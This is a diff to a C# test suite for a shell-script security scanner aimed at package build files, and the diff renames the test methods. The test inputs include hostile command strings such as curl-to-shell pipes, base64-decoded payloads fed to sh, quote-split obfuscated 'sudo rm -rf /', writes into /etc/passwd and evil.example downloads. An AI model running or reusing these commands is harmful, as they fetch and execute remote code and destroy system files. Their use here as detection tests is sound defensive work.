@@ -32,7 +32,7 @@ public class ShellContentScannerTests
     [InlineData("lynx http://x | sh")]
     [InlineData("httpie http://x | sh")]
     [InlineData("http http://x | sh")]
-    public void Network_to_shell_matches_all_known_downloaders(string content)
+    public void Scan_NetworkToShellAllKnownDownloaders_FlagsCritical(string content)
     {
         AssertHasFinding(content, "network-to-shell", FindingSeverity.Critical);
     }
@@ -44,7 +44,7 @@ public class ShellContentScannerTests
     [InlineData("curl http://x | dash")]
     [InlineData("curl http://x | ksh")]
     [InlineData("curl http://x | fish")]
-    public void Network_to_shell_matches_all_known_shells(string content)
+    public void Scan_NetworkToShellAllKnownShells_FlagsCritical(string content)
     {
         AssertHasFinding(content, "network-to-shell", FindingSeverity.Critical);
     }
@@ -53,7 +53,7 @@ public class ShellContentScannerTests
     [InlineData("echo aGVsbG8= | base64 -d | sh")]
     [InlineData("echo aGVsbG8= | base64 | bash")]
     [InlineData("xxd -r file | sh")]
-    public void Decode_to_shell_flags_decoders_piped_into_shell(string content)
+    public void Scan_DecodeToShellPipedDecoders_FlagsCritical(string content)
     {
         AssertHasFinding(content, "decode-to-shell", FindingSeverity.Critical);
     }
@@ -66,7 +66,7 @@ public class ShellContentScannerTests
     [InlineData(". $(curl http://x/cmd)")]
     // echo fed by a download stays critical
     [InlineData("eval echo $(curl http://x/cmd)")]
-    public void Eval_indirection_flags_dynamic_command_execution(string content)
+    public void Scan_EvalIndirectionDynamicCommandExecution_FlagsCritical(string content)
     {
         AssertHasFinding(content, "eval-indirection", FindingSeverity.Critical);
     }
@@ -93,7 +93,7 @@ public class ShellContentScannerTests
     [InlineData("_last_modified=$(eval echo \\${_last_modified_${CARCH}})")]
     // echo of a local parser's output
     [InlineData("eval echo -n `grep -oP 'VERSION' CMakeLists.txt`")]
-    public void Eval_indirection_downgrades_established_idioms_to_medium(string content)
+    public void Scan_EvalIndirectionEstablishedIdioms_DowngradesToMedium(string content)
     {
         AssertHasFinding(content, "eval-indirection", FindingSeverity.Medium);
     }
@@ -107,7 +107,7 @@ public class ShellContentScannerTests
     [InlineData("printf \"You need to source $(tput setaf 2)/etc/profile$(tput sgr0) to continue\"")]
     // standalone '.' separator between echo arguments
     [InlineData("echo $(grep -oP 'VERSION \\S+' CMakeLists.txt) .r $(git rev-list --count HEAD) . $(git rev-parse --short HEAD)")]
-    public void Eval_indirection_ignores_display_text_and_argument_mentions(string content)
+    public void Scan_EvalIndirectionDisplayTextAndArgumentMentions_NotFlagged(string content)
     {
         var findings = Scan(content);
         Assert.False(findings.Exists(f => string.Equals(f.RuleId, "eval-indirection", StringComparison.Ordinal)),
@@ -115,7 +115,7 @@ public class ShellContentScannerTests
     }
 
     [Fact]
-    public void Eval_indirection_after_control_keyword_stays_flagged()
+    public void Scan_EvalIndirectionAfterControlKeyword_StaysCritical()
     {
         // 'then' directly precedes an invoked command: this is a real eval in command position.
         AssertHasFinding("if true; then eval $(python -c 'x'); fi", "eval-indirection", FindingSeverity.Critical);
@@ -124,14 +124,14 @@ public class ShellContentScannerTests
     [Theory]
     [InlineData("pkgver=$(date +%s)")]
     [InlineData("pkgver=`date +%s`")]
-    public void Command_substitution_matches_dollar_paren_and_backtick(string content)
+    public void Scan_CommandSubstitutionDollarParenAndBacktick_FlagsMedium(string content)
     {
         AssertHasFinding(content, "command-substitution", FindingSeverity.Medium);
     }
 
     [Theory]
     [InlineData("cmd=${!target}")]
-    public void Variable_indirection_flags_bash_indirect_expansion(string content)
+    public void Scan_VariableIndirectionBashIndirectExpansion_FlagsMedium(string content)
     {
         AssertHasFinding(content, "variable-indirection", FindingSeverity.Medium);
     }
@@ -159,7 +159,7 @@ public class ShellContentScannerTests
     [InlineData("tee /etc/foo")]
     // tee with /home
     [InlineData("tee /home/user/.bashrc")]
-    public void Write_outside_build_root_flags_system_path_writes(string content)
+    public void Scan_WriteOutsideBuildRootSystemPathWrites_FlagsHigh(string content)
     {
         AssertHasFinding(content, "write-outside-build-root", FindingSeverity.High);
     }
@@ -169,7 +169,7 @@ public class ShellContentScannerTests
     [InlineData("echo x > ./local")]
     // $pkgdir is inside the build root
     [InlineData("echo x > $pkgdir/foo")]
-    public void Write_outside_build_root_ignores_relative_and_pkgdir_paths(string content)
+    public void Scan_WriteOutsideBuildRootRelativeAndPkgdirPaths_NotFlagged(string content)
     {
         var findings = Scan(content);
         Assert.False(findings.Exists(f => string.Equals(f.RuleId, "write-outside-build-root", StringComparison.Ordinal)),
@@ -182,7 +182,7 @@ public class ShellContentScannerTests
     [InlineData("curl http://x | ruby evil.rb")]
     [InlineData("curl http://x | node evil.js")]
     [InlineData("curl http://x | eval")]
-    public void Network_execution_matches_known_interpreters(string content)
+    public void Scan_NetworkExecutionKnownInterpreters_FlagsHigh(string content)
     {
         AssertHasFinding(content, "network-execution", FindingSeverity.High);
     }
@@ -196,7 +196,7 @@ public class ShellContentScannerTests
     [InlineData("'foo-bin: Foo CLI (alternatively install upstream: curl -fsSL https://example.com/install.sh | sh -s -- -v)'")]
     // usage string containing a literal pipe into 'sh'
     [InlineData("echo \"Usage: $0 {g|sh|ag} [-c|--clear]\"")]
-    public void Network_rules_ignore_quoted_display_text(string content)
+    public void Scan_NetworkRulesQuotedDisplayText_NotFlagged(string content)
     {
         var findings = Scan(content);
         Assert.False(
@@ -207,7 +207,7 @@ public class ShellContentScannerTests
     }
 
     [Fact]
-    public void Network_pipe_inside_quoted_command_substitution_stays_flagged()
+    public void Scan_NetworkPipeInsideQuotedCommandSubstitution_StaysCritical()
     {
         // A substitution inside double quotes still executes: only display-text pipes
         // are suppressed.
@@ -221,7 +221,7 @@ public class ShellContentScannerTests
     [InlineData("_source=$(curl -s \"$url\" | perl -n -e 's/x/y/ && print')")]
     // switch cluster containing e
     [InlineData("curl http://x | perl -wne 'print if /v/'")]
-    public void Network_execution_ignores_perl_inline_text_filters(string content)
+    public void Scan_NetworkExecutionPerlInlineTextFilters_NotFlagged(string content)
     {
         var findings = Scan(content);
         Assert.False(findings.Exists(f => string.Equals(f.RuleId, "network-execution", StringComparison.Ordinal)),
@@ -237,13 +237,13 @@ public class ShellContentScannerTests
     [InlineData("curl http://x | perl -MFile::Spec")]
     // -p without -e or a file still reads stdin
     [InlineData("curl http://x | perl -p")]
-    public void Network_execution_still_flags_perl_without_inline_program(string content)
+    public void Scan_NetworkExecutionPerlWithoutInlineProgram_FlagsHigh(string content)
     {
         AssertHasFinding(content, "network-execution", FindingSeverity.High);
     }
 
     [Fact]
-    public void Obfuscated_network_execution_into_perl_filter_stays_critical()
+    public void Scan_ObfuscatedNetworkExecutionIntoPerlFilter_StaysCritical()
     {
         // The perl-filter exemption applies to plainly visible constructs only; hiding the
         // tool names keeps the obfuscation escalation.
@@ -256,7 +256,7 @@ public class ShellContentScannerTests
     [InlineData("echo n | bash ./install.sh --prefix=\"$pkgdir\" > /dev/null")]
     [InlineData("printf '%s\\n' 'yes' ${prefix} | bash \"${srcdir}/installer\" | tee")]
     [InlineData("echo y | sh /opt/installer.sh")]
-    public void Decode_to_shell_ignores_answer_feeding_into_local_scripts(string content)
+    public void Scan_DecodeToShellAnswerFeedingIntoLocalScripts_NotFlagged(string content)
     {
         var findings = Scan(content);
         Assert.False(findings.Exists(f => string.Equals(f.RuleId, "decode-to-shell", StringComparison.Ordinal)),
@@ -268,7 +268,7 @@ public class ShellContentScannerTests
     [InlineData("echo 'aGVsbG8=' | bash")]
     // -s reads commands from stdin
     [InlineData("echo x | bash -s -- -y")]
-    public void Decode_to_shell_still_flags_stdin_execution(string content)
+    public void Scan_DecodeToShellStdinExecution_FlagsCritical(string content)
     {
         AssertHasFinding(content, "decode-to-shell", FindingSeverity.Critical);
     }
@@ -280,7 +280,7 @@ public class ShellContentScannerTests
     [InlineData("pkexec cmd", "pkexec")]
     [InlineData("run0 cmd", "run0")]
     [InlineData("su root -c 'evil'", "su")]
-    public void Privilege_escalation_flags_all_privilege_tools(string content, string tool)
+    public void Scan_PrivilegeEscalationAllPrivilegeTools_FlagsHigh(string content, string tool)
     {
         var findings = Scan(content);
         var finding = findings.FirstOrDefault(f => string.Equals(f.RuleId, "privilege-escalation", StringComparison.Ordinal));
@@ -296,7 +296,7 @@ public class ShellContentScannerTests
     [InlineData("echo 'sudo'")]
     // display text in double quotes
     [InlineData("echo \"sudo is a tool\"")]
-    public void Privilege_escalation_rejects_substring_and_display_matches(string content)
+    public void Scan_PrivilegeEscalationSubstringAndDisplayMatches_NotFlagged(string content)
     {
         var findings = Scan(content);
         Assert.DoesNotContain(findings, f => string.Equals(f.RuleId, "privilege-escalation", StringComparison.Ordinal));
@@ -315,7 +315,7 @@ public class ShellContentScannerTests
     [InlineData("avahi should be enabled first with: sudo systemctl restart avahi-daemon")]
     // shell-prompt illustration
     [InlineData("echo   $ sudo modprobe libcomposite")]
-    public void Privilege_escalation_rejects_tool_names_in_argument_position(string content)
+    public void Scan_PrivilegeEscalationToolNamesInArgumentPosition_NotFlagged(string content)
     {
         var findings = Scan(content);
         Assert.False(findings.Exists(f => string.Equals(f.RuleId, "privilege-escalation", StringComparison.Ordinal)),
@@ -345,13 +345,13 @@ public class ShellContentScannerTests
     [InlineData("generate-config | sudo -u dendrite tee /etc/dendrite/config.yaml")]
     // the argument mention is skipped, the live invocation still flags
     [InlineData("cd sudo && sudo make install")]
-    public void Privilege_escalation_still_flags_tools_in_command_position(string content)
+    public void Scan_PrivilegeEscalationToolsInCommandPosition_FlagsHigh(string content)
     {
         AssertHasFinding(content, "privilege-escalation", FindingSeverity.High);
     }
 
     [Fact]
-    public void Obfuscated_tool_name_in_argument_position_still_escalates()
+    public void Scan_ObfuscatedToolNameInArgumentPosition_EscalatesToCritical()
     {
         // Structural exemptions cover plainly visible constructs only: a hidden tool name is
         // intent evidence wherever it sits.
@@ -368,7 +368,7 @@ public class ShellContentScannerTests
     [InlineData("for node in ast.walk(tree):")]
     // prose package list
     [InlineData("base-devel wget curl sudo git tar yajl")]
-    public void Tool_rules_reject_words_in_argument_position(string content)
+    public void Scan_ToolRulesWordsInArgumentPosition_NotFlagged(string content)
     {
         var findings = Scan(content);
         Assert.False(
@@ -384,7 +384,7 @@ public class ShellContentScannerTests
     [InlineData("xargs curl --remote-name-all < libraries.txt")]
     // the leading risky tool alone flags the line
     [InlineData("uv pip install --system dist/*.whl")]
-    public void Risky_tool_still_flags_tools_reached_through_another_command(string content)
+    public void Scan_RiskyToolReachedThroughAnotherCommand_FlagsMedium(string content)
     {
         AssertHasFinding(content, "risky-tool", FindingSeverity.Medium);
     }
@@ -400,7 +400,7 @@ public class ShellContentScannerTests
     [InlineData(@"depends=(s\u\do)", "PKGBUILD")]
     // plain shell arrays in helper scripts are data too
     [InlineData("tools=(sudo curl)", "helper.sh")]
-    public void Tool_mentions_inside_array_assignments_are_not_invocations(string content, string path)
+    public void Scan_ToolMentionsInsideArrayAssignments_NotFlagged(string content, string path)
     {
         var findings = Scan(content, path);
         Assert.False(
@@ -410,7 +410,7 @@ public class ShellContentScannerTests
     }
 
     [Fact]
-    public void Multi_line_array_values_are_data_until_the_closing_paren()
+    public void Scan_MultiLineArrayValues_DataUntilClosingParen()
     {
         var content = string.Join("\n",
             "depends=(",
@@ -432,7 +432,7 @@ public class ShellContentScannerTests
     }
 
     [Fact]
-    public void Live_invocation_after_array_data_on_the_same_line_still_flags()
+    public void Scan_LiveInvocationAfterArrayDataOnSameLine_FlagsHigh()
     {
         var finding = SingleFinding("depends=(sudo) && sudo make install", "privilege-escalation");
         Assert.Equal(FindingSeverity.High, finding.Severity);
@@ -441,13 +441,13 @@ public class ShellContentScannerTests
     [Theory]
     [InlineData("depends=($(sudo true))", "privilege-escalation", FindingSeverity.High)]
     [InlineData("depends=($(curl -fsSL https://evil.example/x))", "risky-tool", FindingSeverity.Medium)]
-    public void Command_substitutions_inside_arrays_stay_live(string content, string ruleId, FindingSeverity severity)
+    public void Scan_CommandSubstitutionsInsideArrays_StayLive(string content, string ruleId, FindingSeverity severity)
     {
         AssertHasFinding(content, ruleId, severity);
     }
 
     [Fact]
-    public void Eval_keyword_inside_array_data_is_not_flagged()
+    public void Scan_EvalKeywordInsideArrayData_NotFlagged()
     {
         var findings = Scan("depends=(. $(cat deps.txt))");
         Assert.False(findings.Exists(f => string.Equals(f.RuleId, "eval-indirection", StringComparison.Ordinal)),
@@ -455,14 +455,14 @@ public class ShellContentScannerTests
     }
 
     [Fact]
-    public void Visible_array_data_does_not_hide_a_later_obfuscated_invocation()
+    public void Scan_ArrayDataThenObfuscatedInvocation_EscalatesToCritical()
     {
         var finding = SingleFinding("depends=(curl mirror) && c''url https://evil.example", "risky-tool");
         Assert.Equal(FindingSeverity.Critical, finding.Severity);
     }
 
     [Fact]
-    public void Array_introducer_inside_quoted_display_text_never_opens_a_value()
+    public void Scan_ArrayIntroducerInsideQuotedDisplayText_NotFlagged()
     {
         var findings = Scan("echo \"depends=(sudo)\"");
         Assert.DoesNotContain(findings, f => string.Equals(f.RuleId, "privilege-escalation", StringComparison.Ordinal));
@@ -475,7 +475,7 @@ public class ShellContentScannerTests
     [InlineData("su $user -c 'systemctl --user daemon-reload'")]
     // pkexec
     [InlineData("pkexec modprobe acpi_call")]
-    public void Privilege_escalation_in_install_scriptlet_is_downgraded_to_medium(string content)
+    public void Scan_PrivilegeEscalationInInstallScriptlet_DowngradesToMedium(string content)
     {
         // Scriptlets already run as root under alpm's control: the call is redundant,
         // not an escalation.
@@ -486,7 +486,7 @@ public class ShellContentScannerTests
     }
 
     [Fact]
-    public void Obfuscated_privilege_escalation_in_install_scriptlet_is_downgraded_to_medium()
+    public void Scan_ObfuscatedPrivilegeEscalationInInstallScriptlet_DowngradesToMedium()
     {
         // The downgrade is contextual, not syntactic: scriptlets run as root whether or not
         // the tool name is obfuscated.
@@ -501,7 +501,7 @@ public class ShellContentScannerTests
     [InlineData("sudo systemctl restart foo.service", "check.sh")]
     // .bash helper script
     [InlineData("sudo apt update", "makedeb.bash")]
-    public void Privilege_escalation_in_helper_scripts_is_downgraded_to_medium(string content, string path)
+    public void Scan_PrivilegeEscalationInHelperScripts_DowngradesToMedium(string content, string path)
     {
         // Helper scripts ship in the package and only run when the user invokes them
         // voluntarily, typically as root: the escalation tool grants nothing the user
@@ -513,7 +513,7 @@ public class ShellContentScannerTests
     }
 
     [Fact]
-    public void Obfuscated_privilege_escalation_in_helper_scripts_is_downgraded_to_medium()
+    public void Scan_ObfuscatedPrivilegeEscalationInHelperScripts_DowngradesToMedium()
     {
         // The downgrade is contextual, like the scriptlet one: helper scripts run only
         // when invoked voluntarily, obfuscated tool name or not.
@@ -524,7 +524,7 @@ public class ShellContentScannerTests
     }
 
     [Fact]
-    public void Write_outside_build_root_in_helper_scripts_stays_high()
+    public void Scan_WriteOutsideBuildRootInHelperScripts_StaysHigh()
     {
         // At this layer there is no PKGBUILD to check references against (the
         // reference-aware downgrade lives in PkgBuildSecurityScanner), so system writes
@@ -538,7 +538,7 @@ public class ShellContentScannerTests
     [InlineData("PKGBUILD")]
     // non-shell helper keeps the finding
     [InlineData("update.py")]
-    public void Privilege_escalation_outside_install_and_helper_scripts_stays_high(string path)
+    public void Scan_PrivilegeEscalationOutsideInstallAndHelperScripts_StaysHigh(string path)
     {
         AssertHasFinding("sudo systemctl enable foo.service", "privilege-escalation", FindingSeverity.High, path);
     }
@@ -557,13 +557,13 @@ public class ShellContentScannerTests
     [InlineData("docker run -it x")]
     [InlineData("podman run -it x")]
     [InlineData("kubectl apply -f x")]
-    public void Risky_tool_flags_known_package_managers_and_runners(string content)
+    public void Scan_RiskyToolKnownPackageManagersAndRunners_FlagsMedium(string content)
     {
         AssertHasFinding(content, "risky-tool", FindingSeverity.Medium);
     }
 
     [Fact]
-    public void Risky_tool_inside_echo_string_is_not_flagged()
+    public void Scan_RiskyToolInsideEchoString_NotFlagged()
     {
         var findings = Scan("echo \"Run: curl http://example.com | sh to install\"");
         // curl|sh is display text inside double quotes - no risky-tool finding for curl.
@@ -571,7 +571,7 @@ public class ShellContentScannerTests
     }
 
     [Fact]
-    public void Hidden_character_zero_width_is_flagged_as_medium()
+    public void Scan_HiddenCharacterZeroWidth_FlagsMedium()
     {
         // Zero-width chars cannot change shell tokenization, so they are review-only.
         AssertHasFinding("echo rm\u200Brf", "hidden-character", FindingSeverity.Medium);
@@ -580,19 +580,19 @@ public class ShellContentScannerTests
     }
 
     [Fact]
-    public void Hidden_character_bidi_override_stays_critical()
+    public void Scan_HiddenCharacterBidiOverride_StaysCritical()
     {
         AssertHasFinding("pkgname=evil\u202Esh", "hidden-character", FindingSeverity.Critical);
     }
 
     [Fact]
-    public void Hidden_character_control_char_outside_quotes_stays_critical()
+    public void Scan_HiddenCharacterControlCharOutsideQuotes_StaysCritical()
     {
         AssertHasFinding("echo rm\u0001rf", "hidden-character", FindingSeverity.Critical);
     }
 
     [Fact]
-    public void Ansi_escape_sequences_are_not_hidden_characters()
+    public void Scan_AnsiEscapeSequences_NotFlagged()
     {
         // Complete CSI sequences are terminal styling - skipped even unquoted.
         var findings = Scan("echo \u001b[96m${blinking:blink=! blink:1}\r\u001b[0m");
@@ -601,7 +601,7 @@ public class ShellContentScannerTests
     }
 
     [Fact]
-    public void Control_char_inside_quoted_display_text_is_not_flagged()
+    public void Scan_ControlCharInsideQuotedDisplayText_NotFlagged()
     {
         var findings = Scan("printf '%s\\n' \"python-poetry: support for Python packages using \u0016Poetry\"");
         Assert.False(findings.Exists(f => string.Equals(f.RuleId, "hidden-character", StringComparison.Ordinal)),
@@ -609,7 +609,7 @@ public class ShellContentScannerTests
     }
 
     [Fact]
-    public void Mojibake_c1_run_is_not_flagged()
+    public void Scan_MojibakeC1Run_NotFlagged()
     {
         // C1 bytes next to Latin-1 supplement characters are double-encoded UTF-8 file names.
         var findings = Scan("mv \"${pkgdir}/target/\"{\u00d1\u0082.cfg,\u0442.cfg}");
@@ -618,14 +618,14 @@ public class ShellContentScannerTests
     }
 
     [Fact]
-    public void Bare_escape_stays_critical_even_in_quotes()
+    public void Scan_BareEscapeInQuotes_StaysCritical()
     {
         // OSC-style escapes (ESC ] … BEL) can spoof the terminal even as echoed data.
         AssertHasFinding("echo \"\u001b]0;evil title\u0007\"", "hidden-character", FindingSeverity.Critical);
     }
 
     [Fact]
-    public void Hidden_character_finding_snippet_is_the_trimmed_raw_line()
+    public void Scan_HiddenCharacterFinding_SnippetIsTrimmedRawLine()
     {
         // The hidden char may appear before a trailing comment; the comment must remain in the snippet.
         var findings = Scan("echo rm\u200Brf # trailing");
@@ -635,7 +635,7 @@ public class ShellContentScannerTests
     }
 
     [Fact]
-    public void Obfuscated_privilege_escalation_escalates_to_critical()
+    public void Scan_ObfuscatedPrivilegeEscalation_EscalatesToCritical()
     {
         // sudo is split with empty quotes - invisible to plain grep but visible after de-obfuscation.
         var finding = SingleFinding("s''u''d''o rm -rf /", "privilege-escalation");
@@ -645,7 +645,7 @@ public class ShellContentScannerTests
     }
 
     [Fact]
-    public void Obfuscated_network_to_shell_escalates_to_critical()
+    public void Scan_ObfuscatedNetworkToShell_EscalatesToCritical()
     {
         var finding = SingleFinding("c''u''rl https://evil.example/x.sh | s''h", "network-to-shell");
 
@@ -653,7 +653,7 @@ public class ShellContentScannerTests
     }
 
     [Fact]
-    public void Obfuscated_network_execution_escalates_to_critical()
+    public void Scan_ObfuscatedNetworkExecution_EscalatesToCritical()
     {
         var finding = SingleFinding("c''url https://evil.example/x | p''ython evil.py", "network-execution");
 
@@ -666,13 +666,13 @@ public class ShellContentScannerTests
     [InlineData("pkgname=foo")]
     [InlineData("pkgver=1.0")]
     [InlineData("source=(https://example.com/foo.tar.gz::https://github.com/x/y/archive/v1.0.tar.gz)")]
-    public void Scan_produces_no_findings_for_benign_content(string content)
+    public void Scan_BenignContent_NoFindings(string content)
     {
         Assert.Empty(Scan(content));
     }
 
     [Fact]
-    public void Comment_only_line_produces_no_findings()
+    public void Scan_CommentOnlyLine_NoFindings()
     {
         // The comment is stripped before any rule runs, so a malicious-looking construct inside a
         // comment must not be flagged.
@@ -680,7 +680,7 @@ public class ShellContentScannerTests
     }
 
     [Fact]
-    public void Hash_inside_single_quotes_is_not_a_comment()
+    public void Scan_HashInsideSingleQuotes_FlagsNetworkToShell()
     {
         // The '#' here is literal text, not a comment - so the curl|sh inside is real and must be flagged.
         var findings = Scan("echo '# ${pkgver}' ; curl http://x | sh");
@@ -689,7 +689,7 @@ public class ShellContentScannerTests
     }
 
     [Fact]
-    public void Multiple_findings_on_one_line_are_emitted()
+    public void Scan_MultipleFindingsOnOneLine_BothRulesEmitted()
     {
         var findings = Scan("sudo curl http://x | sh");
 
@@ -698,7 +698,7 @@ public class ShellContentScannerTests
     }
 
     [Fact]
-    public void Each_line_of_content_is_scanned_independently()
+    public void Scan_MultipleLines_SnippetIsOwningLine()
     {
         var findings = Scan("echo hello\nsudo whoami\necho done");
 
@@ -708,7 +708,7 @@ public class ShellContentScannerTests
     }
 
     [Fact]
-    public void Path_is_preserved_in_each_finding()
+    public void Scan_CustomPath_PreservedInEachFinding()
     {
         var findings = Scan("sudo whoami", "subdir/foo.install");
 
@@ -717,7 +717,7 @@ public class ShellContentScannerTests
     }
 
     [Fact]
-    public void Snippet_is_trimmed_raw_line_even_when_indented()
+    public void Scan_IndentedLine_SnippetIsTrimmed()
     {
         var findings = Scan("   sudo whoami   ");
 
@@ -725,7 +725,7 @@ public class ShellContentScannerTests
     }
 
     [Fact]
-    public void Scan_does_not_emit_duplicate_findings_for_one_rule_on_one_line()
+    public void Scan_TwoSubstitutionsOnOneLine_SingleCommandSubstitutionFinding()
     {
         // Two $() substitutions on one line should still produce only one command-substitution finding,
         // because the regex finds a single match (the first one) and the rule fires once per match.
@@ -736,7 +736,7 @@ public class ShellContentScannerTests
     }
 
     [Fact]
-    public void Empty_lines_are_skipped()
+    public void Scan_EmptyLines_Skipped()
     {
         var findings = Scan("\n\n   \n\nsudo whoami");
 
@@ -753,7 +753,7 @@ public class ShellContentScannerTests
     [InlineData("echo '`date`'")]
     // single-quoted assignment
     [InlineData("pkgver='$(git describe)'")]
-    public void Command_substitution_inside_single_quotes_is_not_flagged(string content)
+    public void Scan_CommandSubstitutionInsideSingleQuotes_NotFlagged(string content)
     {
         var findings = Scan(content);
         Assert.False(findings.Exists(f => string.Equals(f.RuleId, "command-substitution", StringComparison.Ordinal)),
@@ -767,13 +767,13 @@ public class ShellContentScannerTests
     [InlineData("echo \"`date`\"")]
     // bare substitution
     [InlineData("pkgver=$(date +%s)")]
-    public void Command_substitution_outside_single_quotes_is_still_flagged(string content)
+    public void Scan_CommandSubstitutionOutsideSingleQuotes_FlagsMedium(string content)
     {
         AssertHasFinding(content, "command-substitution", FindingSeverity.Medium);
     }
 
     [Fact]
-    public void Escaped_dollar_substitution_is_not_flagged()
+    public void Scan_EscapedDollarSubstitution_NotFlagged()
     {
         // \$( never expands - the backslash is load-bearing, e.g. Makefile syntax in sed text.
         var findings = Scan("sed -i s/@X@/\\$(CFLAGS)/ Makefile");
@@ -785,7 +785,7 @@ public class ShellContentScannerTests
     [Theory]
     // indirect expansion inside single quotes
     [InlineData("echo '${!var}'")]
-    public void Variable_indirection_inside_single_quotes_is_not_flagged(string content)
+    public void Scan_VariableIndirectionInsideSingleQuotes_NotFlagged(string content)
     {
         var findings = Scan(content);
         Assert.DoesNotContain(findings, f => string.Equals(f.RuleId, "variable-indirection", StringComparison.Ordinal));
@@ -798,7 +798,7 @@ public class ShellContentScannerTests
     [InlineData("echo ' > /etc/passwd'")]
     // tee text inside double quotes
     [InlineData("msg2 \"  tee /etc/foo\"")]
-    public void Write_outside_build_root_inside_quotes_is_not_flagged(string content)
+    public void Scan_WriteOutsideBuildRootInsideQuotes_NotFlagged(string content)
     {
         var findings = Scan(content);
         Assert.False(findings.Exists(f => string.Equals(f.RuleId, "write-outside-build-root", StringComparison.Ordinal)),
@@ -810,7 +810,7 @@ public class ShellContentScannerTests
     [InlineData("echo x > /etc/passwd")]
     // redirect after closed quotes is live
     [InlineData("echo 'done' > /etc/passwd")]
-    public void Write_outside_build_root_outside_quotes_is_still_flagged(string content)
+    public void Scan_WriteOutsideBuildRootOutsideQuotes_FlagsHigh(string content)
     {
         AssertHasFinding(content, "write-outside-build-root", FindingSeverity.High);
     }
@@ -822,7 +822,7 @@ public class ShellContentScannerTests
     [InlineData("openssl rand 32 > /usr/share/foo/key")]
     // config write via tee
     [InlineData("echo config | tee /etc/foo.conf")]
-    public void Write_outside_build_root_in_install_scriptlet_is_downgraded_to_medium(string content)
+    public void Scan_WriteOutsideBuildRootInInstallScriptlet_DowngradesToMedium(string content)
     {
         // Scriptlets run as root under alpm's control; writing system files from one is
         // the ordinary job of a scriptlet.
@@ -833,7 +833,7 @@ public class ShellContentScannerTests
     }
 
     [Fact]
-    public void Obfuscated_write_in_install_scriptlet_is_downgraded_to_medium()
+    public void Scan_ObfuscatedWriteInInstallScriptlet_DowngradesToMedium()
     {
         // upak-style: the backslash before '/' makes the match visible only after
         // normalization, but the scriptlet context still applies.
@@ -848,13 +848,13 @@ public class ShellContentScannerTests
     [InlineData("helper.sh")]
     // build-time write
     [InlineData("PKGBUILD")]
-    public void Write_outside_build_root_outside_install_scriptlets_stays_high(string path)
+    public void Scan_WriteOutsideBuildRootOutsideInstallScriptlets_StaysHigh(string path)
     {
         AssertHasFinding("echo /bin/zsh >> /etc/shells", "write-outside-build-root", FindingSeverity.High, path);
     }
 
     [Fact]
-    public void Obfuscated_write_outside_install_scriptlets_stays_critical()
+    public void Scan_ObfuscatedWriteOutsideInstallScriptlets_StaysCritical()
     {
         var finding = SingleFinding("echo x > \\/root/marker", "write-outside-build-root", "helper.sh");
 
@@ -863,7 +863,7 @@ public class ShellContentScannerTests
     }
 
     [Fact]
-    public void Escaped_redirect_operator_is_not_flagged()
+    public void Scan_EscapedRedirectOperator_NotFlagged()
     {
         var findings = Scan("echo \\> /etc/passwd");
 
@@ -871,7 +871,7 @@ public class ShellContentScannerTests
     }
 
     [Fact]
-    public void Escaped_match_inside_quotes_does_not_flag_risky_tool()
+    public void Scan_EscapedMatchInsideQuotes_RiskyToolNotFlagged()
     {
         // The unescaped $( in the normalized text opens a command substitution that unmasks
         // 'docker' - but the original line keeps it inert inside double quotes (the backslash
@@ -883,7 +883,7 @@ public class ShellContentScannerTests
     }
 
     [Fact]
-    public void Escaped_match_inside_quotes_does_not_flag_privilege_escalation()
+    public void Scan_EscapedMatchInsideQuotes_PrivilegeEscalationNotFlagged()
     {
         var findings = Scan("echo \"then run: \\$(sudo whoami)\"");
 
@@ -892,7 +892,7 @@ public class ShellContentScannerTests
     }
 
     [Fact]
-    public void Obfuscated_tool_inside_command_substitution_still_escalates()
+    public void Scan_ObfuscatedToolInsideCommandSubstitution_EscalatesToCritical()
     {
         // $(...) executes even though the surrounding quotes split the tool name: genuine
         // obfuscation of an invocation, not display text.
@@ -903,7 +903,7 @@ public class ShellContentScannerTests
     }
 
     [Fact]
-    public void Escaped_substitution_inside_quotes_does_not_escalate_command_substitution()
+    public void Scan_EscapedSubstitutionInsideQuotes_CommandSubstitutionStaysMedium()
     {
         // $( only appears after normalization dropped the backslash, inside double quotes.
         var finding = SingleFinding("echo \"$\\(date\\)\"", "command-substitution");
@@ -912,7 +912,7 @@ public class ShellContentScannerTests
     }
 
     [Fact]
-    public void Obfuscation_outside_quotes_still_escalates()
+    public void Scan_ObfuscationOutsideQuotes_EscalatesToCritical()
     {
         // The de-obfuscated tool maps back to unquoted positions: genuine hidden intent.
         var finding = SingleFinding("echo \"x\"; s''u''d''o rm -rf /", "privilege-escalation");
@@ -922,7 +922,7 @@ public class ShellContentScannerTests
     }
 
     [Fact]
-    public void Intra_word_quote_split_download_is_detected_and_escalated()
+    public void Scan_IntraWordQuoteSplitDownload_EscalatesToCritical()
     {
         // c'u'rl is curl after shell quote removal: intra-word quotes are stripped during
         // normalization, the raw line does not match, and the finding escalates.
@@ -933,7 +933,7 @@ public class ShellContentScannerTests
     }
 
     [Fact]
-    public void Intra_word_quote_split_privilege_escalation_is_detected_and_escalated()
+    public void Scan_IntraWordQuoteSplitPrivilegeEscalation_EscalatesToCritical()
     {
         var finding = SingleFinding("s\"u\"do rm -rf /", "privilege-escalation");
 
@@ -941,7 +941,7 @@ public class ShellContentScannerTests
     }
 
     [Fact]
-    public void Edge_quoted_tool_names_remain_exempt_after_intra_word_change()
+    public void Scan_EdgeQuotedToolNames_RiskyToolNotFlagged()
     {
         // 'npm' and "curl" are quoted strings, not invocations: edge quotes are kept by
         // normalization, so the quoted mask still hides the tool names.
@@ -952,7 +952,7 @@ public class ShellContentScannerTests
     }
 
     [Fact]
-    public void Edge_quoted_privilege_tool_mention_remains_exempt_after_intra_word_change()
+    public void Scan_EdgeQuotedPrivilegeToolMention_PrivilegeEscalationNotFlagged()
     {
         var findings = Scan("msg2 \"run 'sudo' to continue\"");
 
@@ -961,7 +961,7 @@ public class ShellContentScannerTests
     }
 
     [Fact]
-    public void Command_substitution_inside_quoted_heredoc_body_is_suppressed()
+    public void Scan_CommandSubstitutionInsideQuotedHeredocBody_NoFindings()
     {
         var findings = Scan("cat <<'EOF'\ndest=\"$LOCAL/$(basename \"$f\")\"\nEOF\n");
 
@@ -973,21 +973,21 @@ public class ShellContentScannerTests
     [InlineData("cat <<\"EOF\"\n$(x)\nEOF\n")]
     // backslash-escaped delimiter
     [InlineData("cat <<\\EOF\n$(x)\nEOF\n")]
-    public void All_quoted_delimiter_forms_suppress_the_body(string content)
+    public void Scan_QuotedDelimiterForms_CommandSubstitutionNotFlagged(string content)
     {
         var findings = Scan(content);
